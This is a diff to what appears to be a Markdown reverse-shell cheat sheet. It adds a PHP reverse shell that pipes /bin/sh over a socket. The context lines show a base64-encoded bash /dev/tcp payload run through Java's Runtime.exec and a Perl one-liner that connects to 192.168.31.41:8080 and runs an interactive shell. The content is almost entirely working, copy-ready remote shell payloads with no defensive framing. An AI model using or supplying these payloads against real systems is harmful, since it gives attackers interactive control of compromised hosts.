@@ -39,3 +39,19 @@ Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS8
 ```text
 perl -e 'use Socket;$i="192.168.31.41";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
+
+
+## PHP 反弹 shell {#php-反弹-shell}
+
+ref: <https://www.leavesongs.com/PHP/backshell-via-php.html>
+
+```php
+$sock = fsockopen($ip, $port);
+$descriptorspec = array(
+        0 => $sock,
+        1 => $sock,
+        2 => $sock
+);
+$process = proc_open('/bin/sh', $descriptorspec, $pipes);
+proc_close($process);
+```
